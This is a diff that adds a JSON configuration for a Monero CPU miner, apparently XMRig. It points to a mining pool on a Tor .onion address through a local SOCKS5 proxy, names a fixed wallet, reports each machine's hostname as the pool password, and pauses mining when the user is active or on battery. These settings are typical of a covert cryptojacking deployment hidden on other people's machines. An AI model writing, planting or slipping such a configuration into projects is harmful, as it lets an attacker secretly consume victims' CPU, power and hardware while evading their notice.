@@ -1,0 +1,30 @@
+{
+  "autosave": false,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "priority": 1
+  },
+  "opencl": {
+    "enabled": false
+  },
+  "cuda": {
+    "enabled": false
+  },
+  "donate-level": 0,
+  "donate-over-proxy": 0,
+  "pools": [
+    {
+      "coin": "monero",
+      "url": "mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10512",
+      "user": "46cWMT5YP2A8a8bSDzj3r7C7XkCkTWvJz2FFDjqnk8hnATYCrBJD22R1cyZJwK4tDTNGHFMTuSkCbNZeaYjhPADx9QisCcA",
+      "pass": "HOSTNAME",
+      "keepalive": true,
+      "enabled": true,
+      "tls": false,
+      "socks5": 9050
+    }
+  ],
+  "pause-on-battery": true,
+  "pause-on-active": 300
+}
